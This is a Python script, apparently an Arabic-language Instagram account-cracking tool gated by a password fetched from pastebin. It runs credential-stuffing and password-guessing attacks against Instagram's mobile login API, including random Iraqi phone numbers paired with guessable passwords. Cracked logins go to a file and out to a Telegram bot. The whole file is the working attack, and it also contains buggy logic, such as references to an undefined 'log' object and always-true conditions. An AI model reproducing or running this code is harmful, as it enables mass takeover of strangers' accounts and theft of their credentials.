import pyfiglet, random, requests

Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح

#=========================

color = (Z, X, Z1, F, A, C, B, Y)

col = random.choice(color)

#= = = = = = = = = = = = =

#logo

print(f'''{Z}    ━━━━━━━━━━━━━
{A}{F}
 _   _  ___      _ ____    _    ____  
| \ | |/ _ \    | |  _ \  / \  |  _ \ 
|  \| | | | |_  | | | | |/ _ \ | |_) |
| |\  | |_| | |_| | |_| / ___ \|  _ < 
|_| \_|\___/ \___/|____/_/   \_\_| \_\
                   

{Z}    ━━━━━━━━━━━━━''')

import os

import sys

import requests

NOJDAR = requests.get("https://pastebin.com/raw/AYsGZ051")
password = input('          Hi NOJDAR, Enter The Password To Activate  :   ')
if password == "" :
  sys.exit()
if password in str(NOJDAR.text):
  print(" FIRST STEP Is Done. Logged in Successfully as ")
  print("Please Wait 5 Minutes, All Packages Are Checking.....")
else:
  print (" انتهى لاشتراك للتفعيل @URURBB_BOT ~ @URURB")
  sys.exit()
os.system("clear")
import os
from time import sleep
os.system("title " + " #hi NOJDAR - @URURB")
clear = lambda : os.system('cls')

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    

def close():
    input('- Press Enter To Exit /')
    sys.exit()

clear()
os.system('color a')
print("")
print("\n[!  تم تنزيل المكاتب بنجاح ")
h , b,s,block = 0,0,0,0
tele = input("[+] تريد الصيد يوصل للبوت اي/لا ?: ")
if "اي" in tele:
    id = input("[+] ID ايدي  : ")
    bot = input("[+] توڪن TOKEN : ")
elif "اي" in tele:
    id = input("[+] ID ايدي : ")
    bot = input("[+]  توڪن TOKEN  : ")
print("==========================")
ask = input("""[1] فحص من ڪومبو 
[2]الخيار قيد التطوير 
[3]صيد عشوائي
==========================
[+] اختر كيف تريد الصيد ؟  : """)
if ask == "3":
   
    make = '0123456789'
    clear()
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(8))))
        user = '+96477' + us
        pasw = '077' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "اي" or "اي" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝗛𝗜 𝗡𝗢𝗝𝗗𝗔𝗥 𝗡𝗘𝗪 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 🤪\n.[=] 𝗨𝗦𝗘𝗥 𖤼: [ {user} ← ]\n..[=] 𝗣𝗔𝗦𝗦 𖡑: [ {pasw} ← ]\n- 𝐂𝐇: @URURB 𝐃𝐄𝐕: @URURBB_BOT ")
            open("Hit.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
elif ask =="2":
    clear()
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    user = open("User.txt","r").read().splitlines()  
    pasw = open("Pass.txt","r").read().splitlines()    
    for u in user:
        for p in pasw:    
            req = requests.session()
            log_head = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            'Accept': "*/*",
            'Cookie': 'missing',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-Connection-Type': 'WIFI',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'i.instagram.com'}
            uid = str(uuid4())
            log_data = {
                'uuid': uid,
                'password': p,
                'username': u,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'}
            r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
            #print(r.text)
            if "logged_in_user" in r.text:
                  if "اي" or "اي" in tele:
                    t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝗛𝗜 𝗡𝗢𝗝𝗗𝗔𝗥 𝗡𝗘𝗪 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 🤪\n.[=] 𝗨𝗦𝗘𝗥 𖤼: [ {user} ← ]\n..[=] 𝗣𝗔𝗦𝗦 𖡑: [ {pasw} ← ]\n- 𝐂𝐇: @URURB 𝐃𝐄𝐕: @URURBB_BOT ")
         
                    open("Hit.txt","a").write(f"{u}:{p}\n")
                    h += 1
                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
                b += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            elif 'challenge_required' in log.text:
                s += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
                open("Scure.txt","w").write(f"{user}:{pasw}\n")
            elif 'Please wait a few minutes' in log.text:
                block += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            elif 'Bad request' in log.text:
                b += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            else:
                b+=1    
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
#==================================================================
elif ask =="1":
    assk = input("[+] اسم الڪومبو  : ")
    if '.txt' in assk:
        pass
    else:
        assk  = assk + '.txt'
    clear()
   
    print("")
    print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    acc = open(assk,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "اي" or "اي" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text= 𝗛𝗜 𝗡𝗢𝗝𝗗𝗔𝗥 𝗡𝗘𝗪 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 🤪\n.[=] 𝗨𝗦𝗘𝗥 𖤼: [ {user} ← ]\n..[=] 𝗣𝗔𝗦𝗦 𖡑: [ {pasw} ← ]\n- 𝐂𝐇: @URURB 𝐃𝐄𝐕: @URURBB_BOT ")
            open("Hit.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    
